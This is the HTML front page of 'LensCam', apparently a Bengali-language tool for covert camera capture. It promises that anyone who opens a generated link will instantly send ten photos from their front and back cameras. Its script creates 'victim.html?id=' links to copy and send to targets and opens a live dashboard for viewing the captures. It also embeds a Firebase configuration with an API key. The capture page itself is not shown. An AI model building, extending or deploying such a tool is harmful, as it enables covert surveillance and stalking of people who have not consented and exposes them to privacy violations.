<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>LensCam • গোপন লিংক তৈরি করুন</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0a0a0f;
      --primary: #00ff9d;
      --accent: #ff00ff;
      --text: #e0e0e0;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Rajdhani', sans-serif;
      min-height: 100vh;
      background: radial-gradient(circle at 50% 50%, #1a0033, #0a0a0f);
      overflow-x: hidden;
    }
    .logo {
      width: 120px;
      height: 120px;
      margin: 30px auto;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%,100% { transform: translateY(0px); }
      50% { transform: translateY(-20px); }
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 3.5em;
      text-align: center;
      background: linear-gradient(90deg, var(--primary), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 20px 0;
      text-shadow: 0 0 30px rgba(0,255,157,0.5);
    }
    p {
      text-align: center;
      font-size: 1.4em;
      max-width: 700px;
      margin: 20px auto;
      opacity: 0.9;
    }
    .thumb {
      width: 90%;
      max-width: 600px;
      border-radius: 20px;
      border: 3px solid var(--primary);
      box-shadow: 0 0 40px rgba(0,255,157,0.4);
      margin: 40px auto;
      display: block;
      animation: pulse-glow 4s infinite;
    }
    @keyframes pulse-glow {
      0%,100% { box-shadow: 0 0 40px rgba(0,255,157,0.4); }
      50% { box-shadow: 0 0 70px rgba(255,0,255,0.6); }
    }
    .btn {
      background: linear-gradient(45deg, var(--primary), var(--accent));
      color: #000;
      padding: 18px 50px;
      font-size: 1.4em;
      font-weight: bold;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      margin: 20px 10px;
      box-shadow: 0 0 30px rgba(0,255,157,0.5);
      transition: all 0.4s;
    }
    .btn:hover {
      transform: translateY(-8px) scale(1.05);
      box-shadow: 0 0 50px rgba(255,0,255,0.7);
    }
    #linkBox {
      margin: 50px auto;
      padding: 30px;
      max-width: 700px;
      background: rgba(20,20,40,0.7);
      border-radius: 20px;
      border: 2px dashed var(--primary);
      backdrop-filter: blur(10px);
      display: none;
      animation: fadeIn 1s;
    }
    #victimLink {
      width: 100%;
      padding: 18px;
      background: #111;
      border: 2px solid var(--primary);
      border-radius: 15px;
      color: var(--primary);
      font-size: 1.1em;
      text-align: center;
      margin: 20px 0;
      word-break: break-all;
    }
    footer {
      text-align: center;
      padding: 40px;
      font-size: 1.2em;
      color: #aaa;
      margin-top: 80px;
    }
    footer span { color: var(--primary); font-weight: bold; }
  </style>
</head>
<body>

<!-- লেন্সক্যাম স্টাইল SVG লোগো -->
<svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="none" stroke="#00ff9d" stroke-width="4"/>
  <circle cx="50" cy="50" r="30" fill="none" stroke="#ff00ff" stroke-width="6"/>
  <circle cx="50" cy="50" r="15" fill="#00ff9d" opacity="0.3"/>
  <circle cx="60" cy="40" r="12" fill="#ff00ff"/>
  <circle cx="62" cy="38" r="5" fill="#fff"/>
</svg>

<h1>LENS CAM</h1>
<p>যে কেউ লিংক ওপেন করলেই তার ফ্রন্ট + ব্যাক ক্যামেরা দিয়ে ১০টা ছবি সাথে সাথে চলে আসবে!</p>

<img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo" class="thumb">

<button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>

<div id="linkBox">
  <h2 style="text-align:center; color:var(--primary);">তোমার লিংক রেডি!</h2>
  <input type="text" id="victimLink" readonly />
  <br><br>
  <button class="btn" onclick="copyLink()">কপি করুন</button>
  <button class="btn" onclick="openDashboard()" style="background:#ff00ff; color:white;">ভিউ করুন (লাইভ ড্যাশবোর্ড)</button>
</div>

<footer>
  © 2025 COPYRIGHT BY <span>X4XOR</span> · ATI LINKABLE THAKBE
</footer>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>

<script>
// তোমার রিয়েল কনফিগ
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);

let currentId = null;

function generateLink() {
  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
  const base = location.href.split('/').slice(0, -1).join('/') + '/';
  const victimUrl = base + "victim.html?id=" + currentId;

  document.getElementById("linkBox").style.display = "block";
  document.getElementById("victimLink").value = victimUrl;
}

function copyLink() {
  const link = document.getElementById("victimLink");
  link.select();
  document.execCommand("copy");
  alert("লিংক কপি হয়ে গেছে!");
}

function openDashboard() {
  if (!currentId) return alert("প্রথমে লিংক তৈরি করুন!");
  window.open("dashboard.html?id=" + currentId, "_blank");
}
</script>
</body>
</html>
